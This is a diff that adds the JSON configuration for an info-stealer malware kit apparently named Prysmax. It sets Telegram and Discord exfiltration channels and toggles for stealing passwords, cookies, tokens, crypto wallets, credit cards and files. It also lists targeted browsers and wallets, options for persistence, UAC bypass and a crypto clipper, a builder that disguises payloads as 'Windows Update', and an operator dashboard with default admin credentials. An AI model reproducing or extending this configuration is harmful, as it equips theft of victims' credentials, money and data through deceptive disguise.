@@ -1,0 +1,90 @@
+{
+    "stealer": {
+        "webhook_url": "",
+        "telegram_bot_token": "",
+        "telegram_chat_id": "",
+        "discord_webhook": "",
+        "features": {
+            "passwords": true,
+            "cookies": true,
+            "tokens": true,
+            "wallets": true,
+            "files": true,
+            "screenshot": true,
+            "system_info": true,
+            "browser_history": true,
+            "bookmarks": true,
+            "credit_cards": true,
+            "startup": false,
+            "persistence": false,
+            "anti_debug": false,
+            "uac_bypass": false,
+            "melt": false,
+            "upx_packing": false,
+            "file_binder": false,
+            "pumper": false,
+            "crypto_clipper": false
+        },
+        "target_browsers": [
+            "chrome",
+            "firefox",
+            "edge",
+            "opera",
+            "brave",
+            "vivaldi",
+            "safari"
+        ],
+        "target_wallets": [
+            "metamask",
+            "exodus",
+            "atomic",
+            "electrum",
+            "binance",
+            "coinbase",
+            "phantom",
+            "solflare"
+        ],
+        "file_extensions": [
+            ".txt",
+            ".doc",
+            ".docx",
+            ".pdf",
+            ".key",
+            ".wallet",
+            ".dat"
+        ]
+    },
+    "web_dashboard": {
+        "host": "0.0.0.0",
+        "port": 5000,
+        "debug": true,
+        "secret_key": "prysmax-secret-key-2025",
+        "database": {
+            "type": "sqlite",
+            "path": "database/prysmax.db"
+        },
+        "admin": {
+            "username": "admin",
+            "password": "prysmax123",
+            "email": "admin@prysmax.local"
+        }
+    },
+    "builder": {
+        "output_directory": "builds/",
+        "icon_path": "",
+        "version_info": {
+            "file_version": "1.0.0.0",
+            "product_version": "1.0.0.0",
+            "company_name": "Prysmax",
+            "file_description": "System Update",
+            "product_name": "Windows Update"
+        }
+    },
+    "logging": {
+        "level": "INFO",
+        "file": "logs/prysmax.log",
+        "max_size": "10MB",
+        "backup_count": 5
+    }
+}
+
